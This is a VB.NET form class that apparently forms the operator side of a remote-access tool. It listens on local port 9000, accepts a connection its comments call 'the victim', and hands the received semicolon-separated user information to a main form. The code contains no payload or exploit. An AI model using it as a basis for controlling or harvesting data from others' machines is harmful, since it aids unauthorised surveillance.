Imports System.IO
Imports System.Text
Imports System.Net.Sockets
Imports System.Threading

Public Class Listening
    Public TCPClient As New TcpClient
    Dim length As Integer
    Dim Thread As System.Threading.Thread
    Dim data As String
    Dim information() As String
    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        Me.Close()
    End Sub

    'Initialize a TCP listener
    Dim TCPListener As New TcpListener(System.Net.IPAddress.Parse("127.0.0.1"), 9000)
    Private Sub Listening_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'start to listen any incoming connection
        TCPListener.Start()
        'run the accept method in the background thread
        Thread = New System.Threading.Thread(AddressOf accept)
        'start the thread (run in background)
        Thread.Start()
    End Sub

    Private Sub accept()
        'accept pending connection request
        TCPClient = TCPListener.AcceptTcpClient
        'if connected to the victim
        If TCPClient.Connected Then
            'use to update the UI
            Thread.Sleep(1000)
            Me.Invoke(Sub()
                          'create a network stream - use to send the data
                          Dim NetStream As NetworkStream = TCPClient.GetStream()
                          'check whether the network stream can read data or not
                          If NetStream.CanRead Then
                              'read the data if available
                              If NetStream.DataAvailable Then
                                  'receive the buffer size
                                  Dim bytes(TCPClient.ReceiveBufferSize) As Byte
                                  'read the bytes by  using the network stream
                                  NetStream.Read(bytes, 0, CInt(TCPClient.ReceiveBufferSize))
                                  'convert the bytes to ASCII
                                  data = Encoding.ASCII.GetString(bytes)
                                  'get the user infomation
                                  information = data.Split(";")
                                  For number As Integer = 0 To information.Length - 1
                                      'hide the listening page
                                      Me.Hide()
                                      'go the main page
                                      Dim Main As New Main(information, TCPClient)
                                      Main.ShowDialog()
                                  Next
                              End If
                          End If
                      End Sub)
        End If
    End Sub

End Class